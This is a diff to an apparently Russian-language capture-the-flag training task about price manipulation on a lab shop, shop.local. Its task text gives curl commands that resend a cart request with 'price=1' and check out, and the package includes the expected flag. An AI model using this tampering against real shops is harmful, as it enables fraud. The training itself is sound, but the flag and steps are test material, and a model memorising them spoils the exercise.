@@ -7,10 +7,13 @@
     "contains": "nto{trust_th3_s3rv3r_n0t_th3_cl13nt}"
   },
   "fs": [
-    { "path": "/home/student/task", "type": "dir" },
+    {
+      "path": "/home/student/task",
+      "type": "dir"
+    },
     {
       "path": "/home/student/task/task.md",
-      "text": "# Практика: манипуляция ценой (business logic)\n\n`shop.local` — магазин. Цена товара подставляется из запроса, а не берётся\nиз БД. Собери заказ по своей цене и оформи его.\n\n1. Цена товара на витрине:\n   curl -s 'http://shop.local/product/1'\n2. Кладём в корзину по нормальной цене (total = 5000):\n   curl -s -X POST 'http://shop.local/cart/add' -d 'product=1&qty=1'\n3. Пришли свою цену тем же запросом — сервер доверится ей:\n   curl -s -X POST 'http://shop.local/cart/add' -d 'product=1&qty=1&price=1'\n4. Оформи заказ:\n   curl -s -X POST 'http://shop.local/checkout' -d 'confirm=1'\n5. В подтверждении — флаг. Запиши (последняя строка) в `found.txt` и набери `check`.\n"
+      "text": "# Практика: манипуляция ценой (business logic)\n\n`shop.local` — магазин. Цена товара подставляется из запроса, а не берётся\nиз БД. Собери заказ по своей цене и оформи его.\n\n1. Цена товара на витрине:\n   curl -s 'http://shop.local/product/1'\n2. Кладём в корзину по нормальной цене (total = 5000):\n   curl -s -X POST 'http://shop.local/cart/add' -d 'product=1&qty=1'\n3. Пришли свою цену тем же запросом — сервер доверится ей:\n   curl -s -X POST 'http://shop.local/cart/add' -d 'product=1&qty=1&price=1'\n4. Оформи заказ:\n   curl -s -X POST 'http://shop.local/checkout' -d 'confirm=1'\n5. В подтверждении — флаг. Запиши (последняя строка) в `found.txt` и набери `check`.\n\n## Повторение (`web-auth-jwt-idor`)\n\nМанипуляция ценой — это доверие к клиентским данным; как ломается доверие к идентификатору в IDOR, разбирали в `web-auth-jwt-idor`. Освежи: сначала зафиксируй эталонную цену и поведение корзины:\n\n    curl -s 'http://shop.local/product/1'; curl -s -X POST 'http://shop.local/cart/add' -d 'product=1&qty=1'\n\nЗапомни `total=5000`. Ниже подсовываешь `price=1` и проверяешь, доверится ли сервер.\n"
     }
   ],
   "tools": {
